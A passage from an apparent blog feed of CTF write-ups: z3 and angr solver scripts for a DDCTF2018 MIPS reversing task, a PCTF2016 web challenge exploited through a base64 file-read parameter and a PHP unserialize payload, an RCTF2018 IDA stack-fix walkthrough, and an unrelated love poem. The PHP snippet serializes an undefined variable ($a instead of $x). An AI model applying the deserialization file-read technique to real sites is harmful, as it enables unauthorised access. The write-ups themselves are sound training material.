class="line">s.add(0xffff6b97*a[0] +0xd61d*a[1] +0xe843*a[2] -0x8c64*a[3] +0xda06*a[4] +0xc5ad*a[5] +0xd02a*a[6] -0x2168*a[7] +0xa89*a[8] +0x2dd*a[9] -0x80cc*a[10] -0x9340*a[11] -0x3f07*a[12] +0x4f74*a[13] +0xb834*a[14] +0x1819*a[15]  &#x3D;&#x3D; 0xa6014d)</span><br><span class="line">s.add(0x48ed*a[0] +0x2141*a[1] +0x33ff*a[2] +0x85a9*a[3] -0x1c88*a[4] +0xa7e6*a[5] -0xde06*a[6] +0xbaf6*a[7] +0xc30f*a[8] -0xada6*a[9] -0xa114*a[10] -0x86e9*a[11] +0x70f9*a[12] +0x7580*a[13] -0x51f8*a[14] -0x492f*a[15]  &#x3D;&#x3D; 0x2fde7c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(s.check()&#x3D;&#x3D;sat):</span><br><span class="line">    c &#x3D; b&#39;&#39;</span><br><span class="line">    m &#x3D; s.model()</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(&quot;a[%d]&#x3D;%d&quot;%(i, m[a[i]].as_long()))</span><br><span class="line">    for i in range(16):</span><br><span class="line">        print(chr(m[a[i]].as_long()&amp;0xff), end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure></div><hr><p>来自‘cq674350529’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">a &#x3D; [BitVec(&#39;a%d&#39; %i, 32) for i in xrange(16)]</span><br><span class="line"></span><br><span class="line">s &#x3D; Solver()</span><br><span class="line">s.add(0xffffc20e*a[0]-0xbd52*a[1]+0x7f57*a[2]+0x96cd*a[3]-0xac7f*a[4] +0x5d80*a[5]+0xb25e*a[6]+0x2447*a[7]+0xba8a*a[8]+0xbb41*a[9]+0xa3a8*a[10]+0xcb12*a[11]-0x6958*a[12]+0x5821*a[13]+0x77ed*a[14]+0xf7ff*a[15] &#x3D;&#x3D; 0x162f0ca )</span><br><span class="line">s.add(0xeb44*a[0]-0x0f99*a[1] - 0x40e7*a[2] +0xdf2e*a[3] -0x4b2e*a[4] -0x96b5*a[5] +0x9d66*a[6] -0xafa8*a[7] -0x6e26*a[8] -0xe655*a[9]- 0x9a6e*a[10] +0x57ba*a[11] -0x227c*a[12] +0xbdd1*a[13] +0xb437*a[14] +0x5d3f*a[15]&#x3D;&#x3D; 0xffec2e48)</span><br><span class="line">s.add(0xe6f1*a[0] +0xa4b2*a[1] -0xfe74*a[2] -0x0f07*a[3] -0x5d22*a[4] -0xb845*a[5] -0x9954*a[6] +0x93ac*a[7] -0x51e4*a[8] -0x4b11*a[9] +0xdc93*a[10] +0x13f8*a[11] +0x246c*a[12] +0xf121*a[13] +0xf09f*a[14] +0x0dfa*a[15] &#x3D;&#x3D; 0xd3c060)</span><br><span class="line">s.add(0xffff7085*a[0] -0x6623*a[1] +0x0686*a[2] +0x4b2d*a[3] +0x68df*a[4] +0x9be7*a[5] +0x21b4*a[6] +0xe25a*a[7] -0xc807*a[8] +0xf695*a[9] -0x5421*a[10] -0x2469*a[11] +0x9f29*a[12] -0xe311*a[13] +0x78f2*a[14] -0x6bda*a[15] &#x3D;&#x3D; 0x8bf576)</span><br><span class="line">s.add(0xffff07b8*a[0] -0xd048*a[1] -0x85f1*a[2] +0xee84*a[3] -0x37d1*a[4] +0xb74a*a[5] +0xcfe2*a[6]+ 0x8f1e*a[7] -0xf211*a[8] -0x83bf*a[9] -0x1249*a[10] +0x7ea7*a[11] -0x4294*a[12] -0xb661*a[13] -0x8a73*a[14] -0x5e5c*a[15] &#x3D;&#x3D; 0xff4ea5b3)</span><br><span class="line">s.add(0xffffd6b5*a[0] -0x2b5f*a[1]+ 0xc981*a[2] -0x60c3*a[3] +0xf8f2*a[4]+ 0xded7*a[5]- 0xf6fb*a[6] +0x1083*a[7]- 0xdc96*a[8]- 0x587e*a[9] -0xb4f5*a[10] +0xf57a*a[11] +0x57d0*a[12] +0xe814*a[13] +0x6169*a[14] +0xf285*a[15] &#x3D;&#x3D; 0x9dd61e)</span><br><span class="line">s.add(0xcd89*a[0] -0xd43d*a[1] +0xf037*a[2] +0x83a8*a[3] -0xa305*a[4] -0xadef*a[5] +0xcaaa*a[6] -0xf145*a[7]- 0x6073*a[8]- 0x2777*a[9] +0x794f*a[10] +0xf00e*a[11] -0xe7d5*a[12] +0x2654*a[13] -0xbed0*a[14] -0xb8af*a[15] &#x3D;&#x3D; 0xff6baab3)</span><br><span class="line">s.add(0xffff6108*a[0] -0x6766*a[1] +0xd58e*a[2] -0x5ca3*a[3] +0x2718*a[4] +0x1e2b*a[5] -0xf49e*a[6] +0xcf78*a[7] +0x7c09*a[8] -0x13b7*a[9] -0xbeee*a[10]- 0xe450*a[11] +0x4da3*a[12] -0x8880*a[13] -0x5691*a[14] +0x8bd8*a[15] &#x3D;&#x3D; 0xff818f06)</span><br><span class="line">s.add(0xffffa564*a[0] -0xa95a*a[1] -0xe643*a[2] +0x0d38*a[3] -0x097a*a[4] -0xeb22*a[5] +0xcac3*a[6] -0x4ed1*a[7] -0x7c8a*a[8] +0xf107*a[9] +0xa59e*a[10]- 0x1213*a[11] +0xb2b5*a[12] -0x7213*a[13] -0x2b83*a[14] -0xa155*a[15] &#x3D;&#x3D; 0xff8d50e7)</span><br><span class="line">s.add(0xffff6c45*a[0] -0x2752*a[1] -0xbdc3*a[2] -0xf495*a[3] -0x7121*a[4] +0x9c41*a[5] -0x9465*a[6]- 0x6ce3*a[7] -0x4f28*a[8] -0x8350*a[9] -0x176e*a[10] +0x7814*a[11] -0x739a*a[12] +0x5494*a[13] +0x142d*a[14] +0xca55*a[15] &#x3D;&#x3D; 0xff3f9826)</span><br><span class="line">s.add(0xcf01*a[0] +0xf378*a[1] +0x1064*a[2] -0xd9a7*a[3] -0x077d*a[4]+ 0x6dab*a[5] -0xaf1f*a[6]- 0x3db7*a[7] +0x3554*a[8] -0xcb8e*a[9] -0x9815*a[10]+ 0xf30b*a[11] +0x9c5e*a[12] -0x5d07*a[13] -0x4c31*a[14] +0xeae0*a[15] &#x3D;&#x3D; 0x213fed)</span><br><span class="line">s.add(0x8bd4*a[0] -0x6d81*a[1] -0xe772*a[2] +0xb6f1*a[3] +0x9b57*a[4] -0x597d*a[5] +0x15d1*a[6]- 0xa55e*a[7]+ 0xfd13*a[8]+ 0x17b4*a[9] +0xec78*a[10] -0xd51a*a[11] +0x56ad*a[12] -0xc319*a[13] +0x9f8e*a[14] +0xfa17*a[15] &#x3D;&#x3D; 0xa9f0dc)</span><br><span class="line">s.add(0xffffb798*a[0] -0x8bef*a[1] +0x109d*a[2]- 0xf9d4*a[3] +0x4ecf*a[4] +0xa896*a[5] +0x773b*a[6] +0x6e8a*a[7] -0x737c*a[8]+ 0x4979*a[9] +0xc685*a[10] -0x96ae*a[11] +0x0bbd*a[12] +0x8280*a[13] +0xe3a9*a[14] -0x730c*a[15] &#x3D;&#x3D; 0xbdeb20)</span><br><span class="line">s.add(0x0b20*a[0] +0x9b9c*a[1] +0xb4aa*a[2]+ 0x6176*a[3] +0x9670*a[4] +0x7c9d*a[5] -0x5402*a[6] -0x8cd2*a[7] +0xac82*a[8] +0xa2f5*a[9] -0x8efd*a[10] -0x65f1*a[11] -0x94b9*a[12] +0x8cb8*a[13] +0x1cb5*a[14] +0x4aa1*a[15] &#x3D;&#x3D; 0x9c7cf5)</span><br><span class="line">s.add(0x57fd*a[0] +0x3d83*a[1] +0xf745*a[2] +0xa5c4*a[3] -0x65fa*a[4] -0x58e9*a[5] +0xbebe*a[6] +0x1820*a[7] -0xd7b9*a[8] -0xb21f*a[9] -0x76a0*a[10] +0xc60d*a[11] +0x168f*a[12] +0x2a96*a[13] +0x31d6*a[14] -0x4b88*a[15] &#x3D;&#x3D; 0xd08e2)</span><br><span class="line">s.add(0xffff1bae*a[0] -0xc7d4*a[1] -0x1554*a[2] +0x7eea*a[3] -0x684d*a[4] +0x6adb*a[5] +0x8534*a[6] -0x3a36*a[7] +0x29f0*a[8] +0xd3f2*a[9] -0x23e5*a[10] -0x6540*a[11] +0xbcd3*a[12] -0xef9b*a[13] +0xefdb*a[14] -0x774e*a[15] &#x3D;&#x3D; 0x178803)</span><br><span class="line"></span><br><span class="line">for item in a:</span><br><span class="line">    s.add(item &gt; 0, item &lt; 127)</span><br><span class="line"></span><br><span class="line">if s.check() &#x3D;&#x3D; sat:</span><br><span class="line">    m &#x3D; s.model()</span><br><span class="line">    flag &#x3D; []</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print &#39;&#39;.join(map(chr, flag))</span><br></pre></td></tr></table></figure></div><h3 id="angr二进制自动化分析及符号执行"><a href="#angr二进制自动化分析及符号执行" class="headerlink" title="angr二进制自动化分析及符号执行"></a>angr二进制自动化分析及符号执行</h3><p>angr是一个基于python的二进制漏洞分析框架，集成了多种主流的分析技术，能够进行动态的符号执行分析和多种静态分析。</p><p>如果我们使用angr的话，就不再需要考虑算法内部的详细原理，利用符号执行可以大大减少分析时间</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00403620                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403624                 addiu   $v0, $fp, 0x98+var_48</span><br><span class="line">.text:00403628                 move    $a0, $v0</span><br><span class="line">.text:0040362C                 jal     sub_400420</span><br><span class="line">.text:00403630                 nop</span><br><span class="line">.text:00403634                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403638                 beqz    $v0, loc_4036E4</span><br><span class="line">.text:0040363C                 nop</span><br></pre></td></tr></table></figure></div><p>通过静态分析可知，程序在0x40362c处调用sub_400420函数，其参数通过寄存器a0传递，然后返回值保存在v0寄存器中。之后对v0的内容进行判断，如果为1则输出flag(flag与用户输入的内容相关)，为0则输出”Wrong”。因此，只需要求解输入，保证sub_400420的返回值为1即可。</p><p>angr脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import angr</span><br><span class="line"></span><br><span class="line">project &#x3D; angr.Project(&#39;.&#x2F;patch&#39;, load_options&#x3D;&#123;&#39;auto_load_libs&#39;:False&#125;)</span><br><span class="line"></span><br><span class="line">start_address &#x3D; 0x400420</span><br><span class="line">memory_address &#x3D; 0x10000000</span><br><span class="line"></span><br><span class="line">find_address &#x3D; 0x4031F0</span><br><span class="line">avoid_address &#x3D; (0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0)</span><br><span class="line"></span><br><span class="line">state &#x3D; project.factory.blank_state(addr&#x3D;start_address)</span><br><span class="line"></span><br><span class="line">for i in xrange(16):</span><br><span class="line">    state.memory.store(memory_address+i*4, state.solver.BVS(&#39;a%d&#39; % i, 32), endness&#x3D;state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">state.regs.a0 &#x3D; memory_address</span><br><span class="line"></span><br><span class="line"># add LAZY_SOLVES to speed up</span><br><span class="line">simgr &#x3D; project.factory.simulation_manager(state, add_options&#x3D;&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line">simgr.explore(find&#x3D;find_address, avoid&#x3D;avoid_address)</span><br><span class="line"></span><br><span class="line">if simgr.found:</span><br><span class="line">    find_state &#x3D; simgr.found[0]</span><br><span class="line"></span><br><span class="line">    # add constraints to reduce the keyspace</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        value &#x3D; find_state.memory.load(memory_address+i*4,4, endness&#x3D;find_state.arch.memory_endness)</span><br><span class="line">        find_state.add_constraints(value &gt; 0, value &lt; 127)</span><br><span class="line"></span><br><span class="line">    flag &#x3D; [find_state.se.eval(find_state.memory.load(memory_address+i*4, 4, endness&#x3D;find_state.arch.memory_endness)) for i in xrange(16)]</span><br><span class="line">    print &#39;&#39;.join(map(chr,flag))</span><br></pre></td></tr></table></figure></div><p>返回1的地址<br><a href="https://i.loli.net/2018/07/16/5b4c618f5dc80.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c618f5dc80.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/16/5b4c6199a3626.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c6199a3626.jpg" class="lazyload"></a><br>find_address是使得函数sub_400420返回值为1的地址，而avoid_address是使得函数sub_400420返回值为0的地址。同时，将输入的16个数字保存在内存地址0x10000000处，然后将其赋值给a0寄存器，实现参数的传递。之后，直接从函数sub_400420的开始处开始分析。</p><hr><p>第二种</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from angr import *</span><br><span class="line">import logging</span><br><span class="line">import IPython</span><br><span class="line">logging.getLogger(&#39;angr.manager&#39;).setLevel(logging.DEBUG)</span><br><span class="line">p &#x3D; Project(&#39;baby_mips&#39;)</span><br><span class="line">state &#x3D; p.factory.blank_state(addr&#x3D;0x400420)</span><br><span class="line">DATA_ADDR &#x3D; 0xA0000</span><br><span class="line">state.regs.a0 &#x3D; DATA_ADDR</span><br><span class="line">for i in range(16*4):</span><br><span class="line">    vec &#x3D; state.solver.BVS(&quot;c&#123;&#125;&quot;.format(i),8,explicit_name&#x3D;True)</span><br><span class="line">    cond &#x3D; state.solver.And(vec&gt;&#x3D;32,vec&lt;&#x3D;126) # low byte</span><br><span class="line">    state.memory.store(DATA_ADDR+i,vec)</span><br><span class="line">    if i % 4 &#x3D;&#x3D; 0:</span><br><span class="line">        pass</span><br><span class="line">    #state.add_constraints(cond)</span><br><span class="line">sm &#x3D; p.factory.simulation_manager(state)</span><br><span class="line">res &#x3D; sm.explore(find&#x3D;0x4031F0,avoid&#x3D;[0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0])</span><br><span class="line"></span><br><span class="line">found &#x3D; res.found[0]</span><br><span class="line">mem &#x3D; found.memory.load(DATA_ADDR,16*4)</span><br><span class="line">print found.solver.eval(mem)</span><br><span class="line">print &#39;##########################################&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(16):</span><br><span class="line">    v &#x3D; found.memory.load(DATA_ADDR + 4*i,1)</span><br><span class="line">    flag &#x3D; flag + found.solver.eval(v,cast_to&#x3D;str)</span><br><span class="line">print flag  #7fe2c58fc9a7eb90</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/16/5b4c6199c866b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c6199c866b.jpg" class="lazyload"></a></p><p>flag每个人都是不一样的，我的用angr解的话，最后得到的是7fe2c58fc9a7eb90</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>于是flag: DDCTF{7fe2c58fc9a7eb90}</p><p>z3解的话还可以得出具体每个变量的值，这里就不放图了</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;DDCTF2018-Reverse-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-Reverse-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 Reverse writeup&quot;&gt;&lt;/a&gt;DDCTF2018</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
    <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
    <category term="Reverse" scheme="https://kabeor.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Miss You</title>
    <link href="https://kabeor.github.io/Miss%20You/"/>
    <id>https://kabeor.github.io/Miss%20You/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:46:11.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote></blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><blockquote></blockquote><p>情不知所起，一往而深</p><blockquote></blockquote><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><blockquote></blockquote><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><blockquote></blockquote><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><blockquote></blockquote><p>Everybody knows I love you bady</p><blockquote></blockquote><p>The faster time passes, the more I miss you</p><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Miss-You&quot;&gt;&lt;a href=&quot;#Miss-You&quot; class=&quot;headerlink&quot; title=&quot;Miss You&quot;&gt;&lt;/a&gt;Miss</summary>
        
      
    
    
    
    
    <category term="You" scheme="https://kabeor.github.io/tags/You/"/>
    
  </entry>
  
  <entry>
    <title>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</title>
    <link href="https://kabeor.github.io/PCTF2016%20Web300%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)/"/>
    <id>https://kabeor.github.io/PCTF2016%20Web300%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:47:12.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PCTF2016-Web300神盾局的秘密-反序列化漏洞"><a href="#PCTF2016-Web300神盾局的秘密-反序列化漏洞" class="headerlink" title="PCTF2016 Web300神盾局的秘密(反序列化漏洞)"></a>PCTF2016 Web300神盾局的秘密(反序列化漏洞)</h1><p>打开之后是这样的<br><a href="https://i.loli.net/2018/07/16/5b4c667ef3187.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c667ef3187.jpg" class="lazyload"></a></p><p>查看网页源代码，只有一行<br><a href="https://i.loli.net/2018/07/16/5b4c667f12cff.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c667f12cff.jpg" class="lazyload"></a></p><p>很明显这是base64加密，于是解密看一下<br><a href="https://i.loli.net/2018/07/16/5b4c667f36854.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c667f36854.jpg" class="lazyload"></a><br>于是看出访问格式为</p><pre><code>showimg.php?img=文件名的base64</code></pre><p>得到格式之后，先看showimg.php，base64加密访问<br><a href="https://i.loli.net/2018/07/16/5b4c787bb195c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787bb195c.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c787bcbff2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787bcbff2.jpg" class="lazyload"></a><br>可以看出，这里过滤掉了一些特殊字符以及pctf字符串。</p><p>我们再来看看index.php，把它base64加密<br><a href="https://i.loli.net/2018/07/16/5b4c787be801d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787be801d.jpg" class="lazyload"></a></p><p>然后访问，查看源代码<br><a href="https://i.loli.net/2018/07/16/5b4c787c0f60f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787c0f60f.jpg" class="lazyload"></a><br>我们看到</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p>require_once语句在脚本执行期间包含并运行指定文件。</p></blockquote><p>于是我们需要访问shield.php,再次base64加密访问<br><a href="https://i.loli.net/2018/07/16/5b4c787c2b7ba.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787c2b7ba.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c787c3ee77.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787c3ee77.jpg" class="lazyload"></a></p><p>这里提示我们flag就在pctf.php里，但是showimg.php中过滤了pctf，那么我们又注意到index.php中最后<br><code>$x=unserialize($g)</code><br>也就是反序列化字符串，所以我们可以自己将pctf.php序列化然后传入</p><p>构造类似shield.php中的类如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename &#x3D; &#39;&#39;) &#123;</span><br><span class="line">            $this -&gt; file &#x3D; $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$x &#x3D; new Shield();</span><br><span class="line">$x -&gt; file &#x3D; &#39;pctf.php&#39;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure></div><p>运行<br><a href="https://i.loli.net/2018/07/16/5b4c787c515d6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787c515d6.jpg" class="lazyload"></a><br>将得到结果传入<br>即访问的是</p><pre><code>index.php?class=序列化字符串</code></pre><p><a href="https://i.loli.net/2018/07/16/5b4c787c675cd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c787c675cd.jpg" class="lazyload"></a></p><p>得到flag</p><p>完结</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;PCTF2016-Web300神盾局的秘密-反序列化漏洞&quot;&gt;&lt;a href=&quot;#PCTF2016-Web300神盾局的秘密-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PCTF2016</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="WriteUP" scheme="https://kabeor.github.io/categories/Web/WriteUP/"/>
    
    
  </entry>
  
  <entry>
    <title>RCTF2018 babyre WriteUp</title>
    <link href="https://kabeor.github.io/RCTF2018%20babyre%20WriteUp/"/>
    <id>https://kabeor.github.io/RCTF2018%20babyre%20WriteUp/</id>
    <published>2018-07-15T16:00:00.000Z</published>
    <updated>2020-03-16T04:48:28.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF2018-babyre-WriteUp"><a href="#RCTF2018-babyre-WriteUp" class="headerlink" title="RCTF2018 babyre WriteUp"></a>RCTF2018 babyre WriteUp</h1><p>题目给了一个压缩包，里面有两个文件<br><a href="https://i.loli.net/2018/07/16/5b4c610c56637.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610c56637.jpg" class="lazyload"></a></p><p>out文件<br><a href="https://i.loli.net/2018/07/16/5b4c610c69bc1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610c69bc1.jpg" class="lazyload"></a></p><p>这种题型应该就是<strong>得到算法后枚举，与正确输出的out作比较</strong></p><p>那么首先拿IDA看一下吧</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>先搜索一下字符串吧<br><a href="https://i.loli.net/2018/07/16/5b4c610c7ddcd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610c7ddcd.jpg" class="lazyload"></a><br>可以看到这些有用的提示，使用交叉引用到汇编指令</p><p>用图形化看一下(最后一张有一点歪了，请原谅)</p><blockquote><p>main函数 0x08048B49<br>比较长，挑重点</p></blockquote><p><a href="https://i.loli.net/2018/07/16/5b4c610c92917.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610c92917.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c610cacf3c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610cacf3c.jpg" class="lazyload"></a></p><blockquote><p>返回输出流程 0x804882B</p></blockquote><p> <a href="https://i.loli.net/2018/07/16/5b4c610cc14cd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610cc14cd.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c610cd608a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610cd608a.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c610cee796.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610cee796.jpg" class="lazyload"></a></p><p>注意到那个红色的报错了吗，是的，我们现在无法F5<br><a href="https://i.loli.net/2018/07/16/5b4c610d0dda9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c610d0dda9.jpg" class="lazyload"></a></p><p>显示<strong>sp分析失败</strong><br>经过搜索学习，明白了这种问题一般都是堆栈不平衡导致的，因此我们需要手动调整栈指针</p><p>首先 菜单栏OPtions-&gt;General<br><a href="https://i.loli.net/2018/07/16/5b4c6129b8c3c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c6129b8c3c.jpg" class="lazyload"></a></p><p>打上勾<br>然后回到汇编窗口，找到loc_80848CBB</p><p><a href="https://i.loli.net/2018/07/16/5b4c6129d2384.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c6129d2384.jpg" class="lazyload"></a></p><p>观察发现，lea和retn处的栈指针都是00，导致问题的出现，因此我们应该运用堆栈平衡原理，将其平衡</p><p>具体来说，想要修改一个位置的指针，需要将鼠标指向这个指针的上一个指针，然后 Alt+K</p><p><a href="https://i.loli.net/2018/07/16/5b4c6129e5917.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c6129e5917.jpg" class="lazyload"></a></p><p>将里面的0x9C修改为0x0，确认<br><a href="https://i.loli.net/2018/07/16/5b4c612a05caa.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a05caa.jpg" class="lazyload"></a></p><p>现在堆栈平衡，就可以F5了</p><p>当然了，还可以选择GDB动态调试，在出错这里下断点，然后步入看汇编，但因为对汇编看的还不是很熟悉，GDB也不常接触，于是只能F5了(流下没技术的泪水)</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>F5看一下<br><a href="https://i.loli.net/2018/07/16/5b4c612a1b97a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c612a1b97a.jpg" class="lazyload"></a></p><p><a 